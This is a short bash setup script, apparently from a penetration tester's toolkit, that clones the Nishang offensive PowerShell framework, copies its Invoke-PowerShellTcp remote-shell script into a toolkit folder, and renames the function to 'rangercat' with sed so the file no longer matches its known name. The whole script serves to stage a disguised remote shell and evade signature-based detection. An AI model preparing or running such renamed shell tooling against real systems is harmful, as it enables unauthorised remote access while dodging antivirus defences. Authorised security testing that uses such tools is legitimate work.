#!/bin/bash



TOOLKIT_DIR="${HOME}/toolkit"
NEWWORD="rangercat"


cd ~
mkdir git
cd git
git clone https://github.com/samratashok/nishang


mkdir -p "${TOOLKIT_DIR}"

cp "${HOME}/git/nishang/Shells/Invoke-PowerShellTcp.ps1" "${TOOLKIT_DIR}/${NEWWORD}.ps1"

file="${TOOLKIT_DIR}/${NEWWORD}.ps1"
sed -i 's/Invoke-PowerShellTcp/rangercat/g' "${file}"

echo -e "[*] Nishang has been downloaded, and a string-replaced shell file is at: ${file}"
